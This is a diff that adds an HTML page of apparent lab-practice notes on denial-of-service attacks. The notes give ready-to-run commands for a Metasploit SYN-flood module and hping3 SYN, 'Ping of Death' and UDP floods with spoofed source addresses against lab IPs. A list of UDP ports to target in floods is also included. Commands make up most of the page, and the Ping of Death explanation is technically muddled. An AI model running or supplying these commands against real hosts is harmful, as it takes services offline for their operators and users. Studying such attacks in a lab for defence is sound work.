@@ -1,0 +1,61 @@
+<html>
+    <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>DoS / DDoS practice</h1>
+
+  <h2>DoS with Metasploit</h2>
+<p>SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. 
+  This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. The process of transmitting such packets is 
+  faster than the system can handle. Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially 
+  open connections while waiting in a listening queue for response ACK packets.</p>
+
+<p>Metasploit is a penetration testing platform that allows a user to find, exploit, and validate vulnerabilities. Also, it provides the infrastructure, 
+  content, and tools to conduct penetration tests and comprehensive security auditing. The Metasploit framework has numerous auxiliary module scripts that 
+  can be used to perform DoS attacks.</p>
+
+<p>Here, we will use the Metasploit tool to perform a DoS attack (SYN flooding) on a target host.</p>
+  <p><ol>
+    <ul>First, check if port 21 is open on the victim pc</ul>
+    <ul>nmap -p 21 10.10.1.11</ul>
+    <ul>msfconsole</ul>
+    <ul>use auxiliary/dos/tcp/synflood</ul>
+    <ul>set RHOST 10.10.1.11</ul>
+    <ul>set RPORT 21</ul>
+    <ul>set SHOSTS (spoofable IP) 10.10.1.19</ul>
+    <ul>exploit -> Enter</ul>
+    <ul>use Wireshark on the victim PC to check what's going on</ul>
+  </ol></p>
+
+  <h2>DoS with hping3</h2>
+  <p>Here, we will use the hping3 tool to perform DoS attacks such as SYN flooding, Ping of Death (PoD) attacks, and 
+    UDP application layer flood attacks on a target host.</p>
+
+  <p><ol>
+    <ul>hping3 -S 10.10.1.11 -a (spoofable IP) 10.10.1.19 -p 22 --flood</ul>
+    <ul>use Wireshark on the victim PC to check what's going on</ul>
+    <ul>observe the graphical view of the captured packets using Statistics from the Wireshark menu bar</ul>
+    <ul>click the I/O Graph option from the drop-down list</ul>
+  </ol></p>
+
+  <h2>Ping of Deatch (PoD) with hping3</h2>
+  <p><ol>
+    <ul>hping3 -d 65538 -S -p 21 --flood 10.10.1.11</ul>
+    <ul>we send a packet that has a size of 65,538 bytes to the target web server</ul>
+    <ul>This packet size exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes</ul>
+    <ul>The receiving system’s reassembly process might cause the system to crash</ul>
+    <ul>use Wireshark on the victim PC to check what's going on</ul>
+  </ol></p>
+
+    <h2>UDP application layer flood attack with hping3</h2>
+  <p><ol>
+    <ul>nmap -p 139 10.10.1.19</ul>
+    <ul>we will use NetBIOS port 139 to perform a UDP application layer flood attack</ul>
+    <ul>hping3 -2 -p 139 --flood 10.10.1.19</ul>
+    <ul>-2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets</ul>
+    <ul>use Wireshark on the victim PC to check what's going on</ul>
+    <ul>you can employ other application layer protocols to perform a UDP application layer flood attack on a target network</ul>
+    <ul>CharGEN (Port 19); SNMPv2 (Port 161); QOTD (Port 17); RPC (Port 135); SSDP (Port 1900); CLDAP (Port 389); TFTP (Port 69); 
+NetBIOS (Port 137,138,139); NTP (Port 123); Quake Network Protocol (Port 26000); VoIP (Port 5060)</ul>
+  </ol></p>
+  
